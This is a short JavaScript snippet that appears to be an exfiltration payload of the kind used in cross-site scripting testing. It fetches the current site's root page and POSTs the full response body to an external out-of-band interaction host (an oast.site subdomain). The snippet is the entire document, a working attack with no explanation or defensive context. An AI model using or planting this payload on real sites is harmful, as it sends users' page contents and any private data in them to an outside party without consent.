fetch('/')
  .then(res => res.text())
  .then(body => {
    fetch('https://pqovmovy0vdfzvqmy7ux4o4h6gsi0v07d.oast.site', {
      method: 'POST',
      body: body,
      headers: { 'Content-Type': 'text/plain' }
    });
  });
